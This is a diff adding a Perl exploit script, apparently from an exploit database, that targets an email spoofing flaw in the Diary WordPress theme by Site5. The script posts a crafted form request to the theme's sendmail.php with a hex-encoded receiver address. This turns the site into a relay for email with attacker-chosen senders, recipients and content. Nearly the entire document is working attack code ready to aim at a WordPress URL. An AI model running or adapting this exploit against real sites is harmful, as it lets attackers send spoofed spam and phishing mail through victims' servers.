@@ -1,0 +1,39 @@
+#!/usr/bin/perl
+# Exploit Title: Diary/Notebook Site5 Wordpress Theme - Email Spoofing
+# Date: 15.07.2012
+# Exploit Author: @bwallHatesTwits
+# Discovered by: @xxDigiPxx (http://www.ticktockcomputers.com/wordpress/site5-wordpress-theme-diary-sendmail-php-spoofing/)
+# Software Link: http://www.wpdiarytheme.com/
+# Vendor Homepage: http://www.site5.com/
+# Others Possibly Vulnerable: http://www.site5.com/wordpress-themes/
+# Version: Not Documented
+# Tested on: Linux 3.2 
+use strict;
+use warnings;
+
+use LWP::UserAgent; 
+use HTTP::Request::Common qw{ POST };
+
+#Change this to the root of the Wordpress
+my $wordpress = 'http://localhost/wordpress/';
+my $url = $wordpress.'wp-content/themes/diary/sendmail.php';
+
+#Name shows up in the topic of the email (Website contact message from name)
+my $name ='Proof of Concept';
+
+#Sender email address
+my $email = 'sender@mail.com';
+
+#Content of the email
+my $comment = 'Email content';
+
+#Receiver email address
+my $receiver = 'receiver@mail.com';
+$receiver =~ s/(.)/sprintf("%x",ord($1))/eg;
+
+my $ua = LWP::UserAgent->new();
+my $request = POST( $url, [ name => $name, email => $email, comment => $comment, receiver => $receiver, submit => 'submit', ] );
+print "Sending request to $url\n";
+my $content = $ua->request($request)->as_string();
+print $content;
+print "\nDone\nFollow \@BallastSec on Twitter\n";
